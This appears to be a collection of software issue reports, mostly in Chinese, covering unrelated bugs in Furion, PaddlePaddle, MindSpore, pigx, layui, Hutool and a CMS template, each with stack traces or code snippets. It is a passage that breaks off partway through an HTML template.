[问题]关于发布单文件出现异常错误的问题,"Furion 版本号 3.0.6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 将项目通过webapi发布，配置为独立、单文件，生成的程序运行报异常错误。 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: Unhandled exception. System.TypeInitializationException: The type initializer for 'Furion.App' threw an exception. ---&gt; System.NullReferenceException: Object reference not set to an instance of an object. at Furion.App.GetAssemblies() at Furion.App..cctor() --- End of inner exception stack trace --- at Microsoft.Extensions.DependencyInjection.ConfigurableOptionsServiceCollectionExtensions.AddConfigurableOptions[TOptions](IServiceCollection services) at Furion.InternalApp.&lt;&gt;c.&lt;ConfigureApplication&gt;b__5_1(WebHostBuilderContext hostContext, IServiceCollection services) at Microsoft.AspNetCore.Builder.ConfigureWebHostBuilder.ConfigureServices(Action`2 configureServices) at Furion.InternalApp.ConfigureApplication(IWebHostBuilder builder, IHostBuilder hostBuilder) at Microsoft.AspNetCore.Builder.AppWebApplicationBuilderExtensions.Inject(WebApplicationBuilder webApplicationBuilder) at Program.&lt;Main&gt;$(String[] args) in I:\csharp_project\backend\Admin.Web.Entry\Program.cs:line 1"
paddle卷积问题：比如图片，paddle定义数据输入的时候是长与宽的乘积，一维的向量，可是图片是二维卷积，这个一维向量不知道怎么弄，paddle后面是怎么处理的呢？。而在tensorflow中是直接定义二维的输入的,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
kisso catalina.out 里面大量输出token日志,"环境: spring 4 , kisso , tomcat logback日志管理 kisso 版本 3.6.12 catalina.out 里面会疯狂输出token字符串的内容 eg: 类似的日志,想问下是什么问题,能修复掉吗   <code>: (tokenjson格式字符串)#3384962178758c51385348633c32bbe5"
idea里面build报错如下,"看了一下:jsp-api.jar已经下项目依赖项里面 是不是pom写得有问题？   <code>: /Users/denghui/java/WCP/src/wcp-web/src/main/java/com/farm/wcp/controller/LoginController.java Error:(91, 76) java: 无法访问javax.servlet.jsp.tagext.TagSupport 找不到javax.servlet.jsp.tagext.TagSupport的类文件"
[CT][MS][numpy_native]np.mean could not work with empty tensor,"GPU -- MindSpore version : graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: def test_mean(): A = np.array([[1.0, 2, 3], [4, 5, 6]]) assert_array_equal(np.mean(A), 3.5) assert_array_equal(np.mean(A, 0), np.array([2.5, 3.5, 4.5])) assert_array_equal(np.mean(A, 1), np.array([2., 5.])) with warnings.catch_warnings(record=True) as w: warnings.filterwarnings('always', '', RuntimeWarning) assert_(numpy.isnan(np.mean(np.array([])))) assert_(w[0].category is RuntimeWarning)"
 使用AdaGradoptimizor总是numPorts > 0 check错误,"paddle集群训练模型，使用AdaGradoptimizor，sparse_update训练模型，报错的log如下，实际配置中port是有值的，修改过好几个port都是一样的错误：   <code>: Log file created at: 2017/09/04 13:47:15 Running on machine: yq01-hpc-m12-xi3-wutai02-w0339.yq01.baidu.com Log line format: [IWEF]mmdd hh:mm:ss.uuuuuu threadid file:line] msg I0904 13:47:15.978762 11988 Util.cpp:166] commandline: ./paddle_trainer --num_gradient_servers=100 --trainer_id=0 --pservers=10.87.123.40,10.87.103.41,10.87.103.42,10.87.103.43,10.87.103.44,10.87.121.11,10.87.121.12,10.87.121.13,10.87.121.14,10.87.121.15,10.87.121.16,10.87.121.17,10.87.121.18,10.87.121.19,10.87.121.20,10.87.121.21,10.87.121.22,10.87.121.23,10.87.121.24,10.87.121.25,10.87.121.26,10.87.121.27,10.87.121.28,10.87.121.29,10.87.121.30,10.87.121.31,10.87.121.32,10.87.121.33,10.87.121.34,10.87.121.35,10.87.121.36,10.87.121.37,10.87.121.38,10.87.121.40,10.87.121.41,10.87.121.42,10.87.121.43,10.87.121.44,10.87.122.40,10.87.122.41,10.87.122.42,10.87.122.43,10.87.122.44,10.87.123.11,10.87.123.26,10.87.123.27,10.87.123.28,10.87.123.29,10.87.123.30,10.87.123.31,10.87.123.32,10.87.123.33,10.87.123.34,10.87.123.35,10.87.123.36,10.87.123.37,10.87.123.38,10.87.123.39,10.87.103.40,10.87.123.41,10.87.123.42,10.87.123.43,10.87.124.11,10.87.124.12,10.87.124.13,10.87.124.14,10.87.124.15,10.87.124.16,10.87.124.17,10.87.124.18,10.87.124.19,10.87.124.20,10.87.124.21,10.87.98.42,10.87.98.43,10.87.98.44,10.87.100.11,10.87.100.12,10.87.100.13,10.87.100.14,10.87.100.15,10.87.100.17,10.87.100.18,10.87.100.19,10.87.100.20,10.87.100.21,10.87.100.22,10.87.100.23,10.87.100.24,10.87.100.25,10.87.100.26,10.87.100.27,10.87.100.28,10.87.100.29,10.87.100.30,10.87.100.31,10.87.100.32,10.87.100.33,10.87.100.34,10.87.100.35 --rdma_tcp=tcp --nics=xgbe0 --port=7533 --ports_num=1 --test_all_data_in_one_period=true --log_period=50 --num_passes=15 --trainer_count=8 --config_args=is_cluster=1 --local=0 --config=conf/trainer_config.conf --save_dir=./output --use_gpu=0 I0904 13:47:16.340555 11988 Trainer.cpp:162] trainer mode: SgdSparseCpuTraining I0904 13:47:16.340582 11988 TrainerInternal.cpp:239] Sgd sparse training can not work with ConcurrentRemoteParameterUpdater, automatically reset --use_old_updater=true I0904 13:47:20.717519 11988 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process I0904 13:47:20.718600 11988 GradientMachine.cpp:86] Initing parameters.. I0904 13:47:42.354303 11988 GradientMachine.cpp:93] Init parameters done. **F0904 13:47:42.354418 11989 BaseClient.cpp:27] Check failed: numPorts &gt; 0 (0 vs. 0)**"
The __shfl_down_sync invocation is wrong,"The mask can be considered the set of threads in the warp that should participate in the collective operation. https://github.com/PaddlePaddle/Paddle/blob/4613aeba0e4080d21865d3cc532f8c3ece25792a/paddle/fluid/operators/math/cross_entropy.cu#L34-L39   <code>: T __shfl_down_sync(unsigned mask,T var, unsigned detla, int width=warpSize);"
CompletableFuture 中调用 feign 报错,"环境信息 pigx版本: v4.5 是否修改包名: 否 提供详细 在使用 CompletableFuture 进行异步调用时会出现如下错误。   <code>: 2022-10-11 22:48:40,600 [XNIO-1 task-1] ERROR [c.b.s.c.sentinel.handle.GlobalBizExceptionHandler] GlobalBizExceptionHandler.java:31 - 全局异常信息 ex=org.springframework.beans.factory.support.ScopeNotActiveException: Error creating bean with name 'scopedTarget.oauth2ClientContext': Scope 'request' is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton; nested exception is java.lang.IllegalStateException: No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request. java.util.concurrent.CompletionException: org.springframework.beans.factory.support.ScopeNotActiveException: Error creating bean with name 'scopedTarget.oauth2ClientContext': Scope 'request' is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton; nested exception is java.lang.IllegalStateException: No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request. at java.util.concurrent.CompletableFuture.encodeThrowable(CompletableFuture.java:273) at java.util.concurrent.CompletableFuture.completeThrowable(CompletableFuture.java:280) at java.util.concurrent.CompletableFuture$AsyncSupply.run$$$capture(CompletableFuture.java:1606) at java.util.concurrent.CompletableFuture$AsyncSupply.run(CompletableFuture.java) at java.util.concurrent.CompletableFuture$AsyncSupply.exec(CompletableFuture.java:1596) at java.util.concurrent.ForkJoinTask.doExec$$$capture(ForkJoinTask.java:289) at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java) at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1067) at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1703) at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:172) Caused by: org.springframework.beans.factory.support.ScopeNotActiveException: Error creating bean with name 'scopedTarget.oauth2ClientContext': Scope 'request' is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton; nested exception is java.lang.IllegalStateException: No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request. at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:383) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.aop.target.SimpleBeanTargetSource.getTarget(SimpleBeanTargetSource.java:35) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:195) at com.sun.proxy.$Proxy297.getAccessToken(Unknown Source) at org.springframework.cloud.commons.security.AccessTokenContextRelay.copyToken(AccessTokenContextRelay.java:52) at com.pig4cloud.pigx.common.security.interceptor.PigxFeignClientInterceptor.apply(PigxFeignClientInterceptor.java:55) at feign.SynchronousMethodHandler.targetRequest(SynchronousMethodHandler.java:161) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:110) at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) at com.pig4cloud.pigx.common.sentinel.feign.PigxSentinelInvocationHandler.invoke(PigxSentinelInvocationHandler.java:95) at org.springframework.cloud.openfeign.FeignCachingInvocationHandlerFactory$1.proceed(FeignCachingInvocationHandlerFactory.java:66) at org.springframework.cache.interceptor.CacheInterceptor.lambda$invoke$0(CacheInterceptor.java:54) at org.springframework.cache.interceptor.CacheAspectSupport.execute(CacheAspectSupport.java:351) at org.springframework.cache.interceptor.CacheInterceptor.invoke(CacheInterceptor.java:64) at org.springframework.cloud.openfeign.FeignCachingInvocationHandlerFactory.lambda$create$1(FeignCachingInvocationHandlerFactory.java:53) at com.sun.proxy.$Proxy342.getDictByType(Unknown Source) at com.byd.sws.common.data.resolver.DictResolver.getDictItemsByType(DictResolver.java:65) at com.byd.sws.common.data.resolver.DictResolver.lambda$null$2(DictResolver.java:38) at java.util.concurrent.CompletableFuture$AsyncSupply.run$$$capture(CompletableFuture.java:1604) ... 7 common frames omitted Caused by: java.lang.IllegalStateException: No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request. at org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes(RequestContextHolder.java:131) at org.springframework.web.context.request.AbstractRequestAttributesScope.get(AbstractRequestAttributesScope.java:42) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:371) ... 26 common frames omitted"
如何实现密码模式通过自定义controller登录入口，重定向到授权中心所在host与端口,pigx版本: 3.4.0 是否修改包名: 否   <code>: 1.已经通过loadUserByUsername实现demo数据库里的会员表（sys_member）登录功能； 2.但是现在用postman请求授权接口（http://localhost:8080/auth/oauth/token）登录， 要传的参数比较多（要传scope和grant_type），而且username要拼接分隔符；如图0.png所示。 3.能否在demo站点中调用自定义api（如：http://localhost:8080/login/member/login）， 只需要传username和password即可实现登录？如图1.png所示。 如下图所示
"The whl package downloaded from ""Install using pip"" can not run","After following the pip install steps, downloading and installing ""paddlepaddle_gpu-0.11.0-cp27-cp27mu-linux_x86_64.whl"", and run PaddlePaddle, got error:   <code>: ImportError: libmkldnn.so.0: cannot open shared object file: No such file or directory"
PageFactory.java分页有bug,92行处有bug 应为而实际为   <code>: kernel-d-db/db-api/src/main/java/cn/stylefeng/roses/kernel/db/api/factory/PageFactory.java pageSize = baseRequest.getPageSize() == null ? pageSize : baseRequest.getPageSize(); pageSize = baseRequest.getPageSize() == null ? pageNo : baseRequest.getPageSize();
报错:ApplicationContextException,maven依赖: 异常信息：   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;29.0-jre&lt;/version&gt; &lt;/dependency&gt; org.springframework.context.ApplicationContextException: Failed to start bean 'documentationPluginsBootstrapper'; nested exception is com.google.common.util.concurrent.ExecutionError: com.google.common.util.concurrent.ExecutionError: java.lang.NoClassDefFoundError: javax/validation/constraints/Min at org.springframework.context.support.DefaultLifecycleProcessor.doStart(DefaultLifecycleProcessor.java:185) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.context.support.DefaultLifecycleProcessor.access$200(DefaultLifecycleProcessor.java:53) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.context.support.DefaultLifecycleProcessor$LifecycleGroup.start(DefaultLifecycleProcessor.java:360) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.context.support.DefaultLifecycleProcessor.startBeans(DefaultLifecycleProcessor.java:158) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.context.support.DefaultLifecycleProcessor.onRefresh(DefaultLifecycleProcessor.java:122) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:894) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.finishRefresh(ServletWebServerApplicationContext.java:162) ~[spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:553) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) ~[spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) [spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) [spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) [spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) [spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) [spring-boot-2.2.2.RELEASE.jar:2.2.2.RELEASE] at com.zaw.heraservice.Application.main(Application.java:20) [classes/:na] Caused by: com.google.common.util.concurrent.ExecutionError: com.google.common.util.concurrent.ExecutionError: java.lang.NoClassDefFoundError: javax/validation/constraints/Min at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2049) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache.get(LocalCache.java:3951) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3974) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4958) ~[guava-29.0-jre.jar:na] at springfox.documentation.schema.CachingModelProvider.modelFor(CachingModelProvider.java:59) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.spring.web.scanners.ApiModelReader.read(ApiModelReader.java:69) ~[springfox-spring-web-2.9.2.jar:null] at springfox.documentation.spring.web.scanners.ApiListingScanner.scan(ApiListingScanner.java:133) ~[springfox-spring-web-2.9.2.jar:null] at springfox.documentation.spring.web.scanners.ApiDocumentationScanner.scan(ApiDocumentationScanner.java:71) ~[springfox-spring-web-2.9.2.jar:null] at springfox.documentation.spring.web.plugins.DocumentationPluginsBootstrapper.scanDocumentation(DocumentationPluginsBootstrapper.java:101) ~[springfox-spring-web-2.9.2.jar:null] at springfox.documentation.spring.web.plugins.DocumentationPluginsBootstrapper.start(DocumentationPluginsBootstrapper.java:167) ~[springfox-spring-web-2.9.2.jar:null] at org.springframework.context.support.DefaultLifecycleProcessor.doStart(DefaultLifecycleProcessor.java:182) ~[spring-context-5.2.2.RELEASE.jar:5.2.2.RELEASE] ... 14 common frames omitted Caused by: com.google.common.util.concurrent.ExecutionError: java.lang.NoClassDefFoundError: javax/validation/constraints/Min at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2049) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache.get(LocalCache.java:3951) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3974) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4958) ~[guava-29.0-jre.jar:na] at springfox.documentation.schema.property.CachingModelPropertiesProvider.propertiesFor(CachingModelPropertiesProvider.java:64) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.DefaultModelProvider.properties(DefaultModelProvider.java:166) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.DefaultModelProvider.reflectionBasedModel(DefaultModelProvider.java:100) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.DefaultModelProvider.modelFor(DefaultModelProvider.java:95) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.CachingModelProvider$1.load(CachingModelProvider.java:51) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.CachingModelProvider$1.load(CachingModelProvider.java:49) ~[springfox-schema-2.9.2.jar:null] at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3529) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2278) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2155) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2045) ~[guava-29.0-jre.jar:na] ... 24 common frames omitted Caused by: java.lang.NoClassDefFoundError: javax/validation/constraints/Min at springfox.bean.validators.plugins.schema.MinMaxAnnotationPlugin.extractMin(MinMaxAnnotationPlugin.java:57) ~[springfox-bean-validators-2.9.2.jar:null] at springfox.bean.validators.plugins.schema.MinMaxAnnotationPlugin.apply(MinMaxAnnotationPlugin.java:48) ~[springfox-bean-validators-2.9.2.jar:null] at springfox.documentation.schema.plugins.SchemaPluginsManager.property(SchemaPluginsManager.java:63) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider.beanModelProperty(OptimizedModelPropertiesProvider.java:326) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider.access$200(OptimizedModelPropertiesProvider.java:76) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider$2.apply(OptimizedModelPropertiesProvider.java:175) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider$2.apply(OptimizedModelPropertiesProvider.java:161) ~[springfox-schema-2.9.2.jar:null] at com.google.common.base.Present.transform(Present.java:75) ~[guava-29.0-jre.jar:na] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider.candidateProperties(OptimizedModelPropertiesProvider.java:218) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider.propertiesFor(OptimizedModelPropertiesProvider.java:132) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.OptimizedModelPropertiesProvider.propertiesFor(OptimizedModelPropertiesProvider.java:118) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.CachingModelPropertiesProvider$1.load(CachingModelPropertiesProvider.java:56) ~[springfox-schema-2.9.2.jar:null] at springfox.documentation.schema.property.CachingModelPropertiesProvider$1.load(CachingModelPropertiesProvider.java:54) ~[springfox-schema-2.9.2.jar:null] at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3529) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2278) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2155) ~[guava-29.0-jre.jar:na] at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2045) ~[guava-29.0-jre.jar:na] ... 37 common frames omitted Caused by: java.lang.ClassNotFoundException: javax.validation.constraints.Min at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[na:1.8.0_231] at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[na:1.8.0_231] at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:355) ~[na:1.8.0_231] at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[na:1.8.0_231] ... 54 common frames omitted
2.6.10之后的版本中静态转换的Table单元格中不支持html了吗？,"2.6.10之后的版本中， 静态转换 的Table中单元格不支持html了吗？还是需要去设置什么？看了更新日志，没有看到有相关说明，求大家指点下，谢谢！   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1""&gt; &lt;title&gt;在线测试&lt;/title&gt; &lt;link href=""https://cdn.staticfile.org/layui/2.6.11/css/layui.css"" rel=""stylesheet""&gt; &lt;style&gt; body{padding: 6px 16px;} .demo-carousel{height: 200px; line-height: 200px; text-align: center;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;table lay-filter=""parse-table"" lay-data=""{id: 'my_table'}""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{field:'id', width:80, align: 'center', unresize:'true'}""&gt;ID&lt;/th&gt; &lt;th lay-data=""{field:'title', minWidth:150,unresize:'true'}""&gt;标题&lt;/th&gt; &lt;th lay-data=""{field:'edit', minWidth: 200, align: 'center', fixed: 'right',unresize:'true'}""&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;标题1&lt;/td&gt; &lt;td&gt;&lt;a href=""#1"" class=""layui-btn layui-btn-xs""&gt;编辑&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;标题2&lt;/td&gt; &lt;td&gt;&lt;a href=""#2"" class=""layui-btn layui-btn-xs""&gt;编辑&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;标题3&lt;/td&gt; &lt;td&gt;&lt;a href=""#3"" class=""layui-btn layui-btn-xs""&gt;编辑&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script src=""https://cdn.staticfile.org/layui/2.6.11/layui.js""&gt;&lt;/script&gt; &lt;script&gt; layui.use(function(){ var table = layui.table; //表格 table.init('parse-table',{limit: 10}); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
关于自定义实现日志门面后与Hutool中的Log整合问题,"JDK版本： openjdk 1.8.0_211 hutool版本： 5.7.22 在Hutool文档中介绍了如何自定义日志门面并与Hutool的日志整合的方法，其中提到在第一次调用方法前需要设置，但是由于静态常量是优先加载的，此时设置方法会在调用方法后执行，导致输出时先采用Hutool内部的GlobalFactory()实现，导致整合失败。 请求大神们指教该如何修正。 项目源码：https://gitee.com/yixi-dlmu/cogo   <code>: LogFactory.get() LogFactory.setCurrentLogFactory() @CogoApplication public class Test { static { LogFactory.setCurrentLogFactory(new CogoLogFactory(""CogoLogFactory"")); } private static final Log log = LogFactory.get(Test.class); public static void main(String[] args) { CogoStarter.run(Test.class); log.debug(""hello world""); } } package cn.edu.dlmu.cogo.framework.log; import cn.hutool.core.util.ClassUtil; import cn.hutool.log.Log; import cn.hutool.log.LogFactory; /** * @author yixi */ public class CogoLogFactory extends LogFactory { public CogoLogFactory(String name) { super(name); } @Override public Log createLog(String s) { return new CogoLog(s); } @Override public Log createLog(Class&lt;?&gt; aClass) { return new CogoLog(ClassUtil.getShortClassName(aClass.getName())); } } @CogoApplication public class Test { public static void main(String[] args) { CogoStarter.run(Test.class); Log log = LogFactory.get(Test.class); log.debug(""hello world""); } }"
The destructor of `BlockDescBind` is wrong,We should not free the and in since we use of Protobuf to add and but not take the ownership   <code>: OpDesc VarDesc BlockDescBind AddAllocated OpDesc VarDesc
首页用选项卡调用栏目代码循环标签怎么写？,"类似于这种放在首页的话怎么调用循环标签呢？   <code>: &lt;div class=""pro""&gt; &lt;div class=""title""&gt; &lt;p&gt;PRODUCT&lt;/p&gt; &lt;h3&gt;&lt;a href=""/?products/""&gt;产品中心&lt;/a&gt;&lt;/h3&gt; &lt;/div&gt; &lt;ul class=""menu""&gt; &lt;li&gt; &lt;a href=""/?lm1/""&gt;产品分类一&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=""/?lm2/""&gt;产品分类二&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=""/?lm3/""&gt;产品分类三&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=""/?lm4/""&gt;产品分类四&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=""/?lm5/""&gt;产品分类五&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=""/?lm6/""&gt;产品分类六&lt;/a&gt;&lt;img src=""/skin/img/pro_s.png"" width=""18"" height=""9""&gt; &lt;/li&gt; &lt;/ul&gt; &lt;div class=""pbox""&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm1/"" title=""产品分类一""&gt;&lt;img src=""/static/upload/image/20220421/1650531218851301.jpg"" alt=""产品分类一"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; &lt;ul&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH9152020J2.jpg"" alt=""产品名称二"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称二&lt;/span&gt; &lt;a href=""/?lm1/52.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH915221BA.jpg"" alt=""产品名称四"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称四&lt;/span&gt; &lt;a href=""/?lm1/55.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH91521123P.jpg"" alt=""产品名称三"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称三&lt;/span&gt; &lt;a href=""/?lm1/53.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH915155T28.jpg"" alt=""产品名称一"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称一&lt;/span&gt; &lt;a href=""/?lm1/51.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm2/"" title=""产品分类二""&gt;&lt;img src=""/static/upload/image/20220421/1650531233630061.jpg"" alt=""产品分类二"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; &lt;ul&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH9152415647.jpg"" alt=""产品名称七"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称七&lt;/span&gt; &lt;a href=""/?lm2/54.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH9152325C3.jpg"" alt=""产品名称六"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称六&lt;/span&gt; &lt;a href=""/?lm2/57.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;li class=""libor libtm""&gt; &lt;img src=""/uploads/170729/1-1FH9152240455.jpg"" alt=""产品名称五"" width=""246"" height=""227""&gt; &lt;span&gt;产品名称五&lt;/span&gt; &lt;a href=""/?lm2/56.html""&gt;点击查看详情&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm3/"" title=""产品分类三""&gt;&lt;img src=""/static/upload/image/20220421/1650531243923002.jpg"" alt=""产品分类三"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; &lt;ul&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm4/"" title=""产品分类四""&gt;&lt;img src=""/static/upload/image/20220421/1650531261625640.jpg"" alt=""产品分类四"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; &lt;ul&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=""plist""&gt; &lt;a href=""/?lm5/"" title=""产品分类五""&gt;&lt;img src=""/static/upload/image/20220421/1650531274145421.jpg"" alt=""产品分类五"" width=""504"" height=""580"" class=""lefttu""&gt;&lt;/a&gt; 